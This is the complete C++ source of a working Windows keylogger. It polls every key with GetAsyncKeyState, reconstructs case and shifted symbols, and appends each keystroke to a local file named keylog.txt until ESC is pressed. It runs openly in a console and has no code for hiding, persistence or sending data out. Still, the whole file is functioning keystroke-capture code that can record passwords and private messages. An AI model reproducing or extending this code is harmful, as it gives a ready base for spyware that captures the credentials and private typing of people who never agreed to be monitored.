#include <iostream>
#include <fstream>
#include <Windows.h>
using namespace std;

bool keyStates[256] = { false }; // keeps track of current key states

void logKeystroke(int key, const string& file) {
    ofstream logFile(file, ios::app);

    bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) || 
                        (GetAsyncKeyState(VK_LSHIFT) & 0x8000) ||
                        (GetAsyncKeyState(VK_RSHIFT) & 0x8000);

    bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001);

    if (key >= 'A' && key <= 'Z') {
        bool upper = (shiftPressed ^ capsLockOn);  // XOR logic
        char letter = upper ? char(key) : char(key + 32); // Convert to lowercase if needed
        logFile << letter;
    }
    else if (key >= '0' && key <= '9') {
        // Handle SHIFT+number (symbols like ! @ #)
        if (shiftPressed) {
            string shiftedNums[] = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(" };
            logFile << shiftedNums[key - '0'];
        } else {
            logFile << char(key);
        }
    }
    else {
        switch (key) {
            case VK_SPACE:
                logFile << " ";
                break;
            case VK_RETURN:
                logFile << "[ENTER]\n";
                break;
            case VK_BACK:
                logFile << "[BACKSPACE]";
                break;
            case VK_TAB:
                logFile << "[TAB]";
                break;
            case VK_SHIFT:
            case VK_LSHIFT:
            case VK_RSHIFT:
                logFile << "[SHIFT]";
                break;
            case VK_CONTROL:
            case VK_LCONTROL:
            case VK_RCONTROL:
                logFile << "[CTRL]";
                break;
            case VK_ESCAPE:
                logFile << "[ESC]";
                break;
            default:
                logFile << "[" << key << "]";
        }
    }

    logFile.close();
}

int main() {
    string file = "keylog.txt";
    cout << "Logging started. Press ESC to stop.\n";

    while (true) {
        for (int key = 8; key <= 190; key++) {
            // Detect fresh key press
            if (GetAsyncKeyState(key) & 0x8000) {
                if (!keyStates[key]) {
                    logKeystroke(key, file);
                    keyStates[key] = true;
                }
            } else {
                keyStates[key] = false; // key released
            }
        }

        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
            cout << "Logging stopped.\n";
            break;
        }

        Sleep(10); // prevent CPU overuse
    }

    return 0;
}
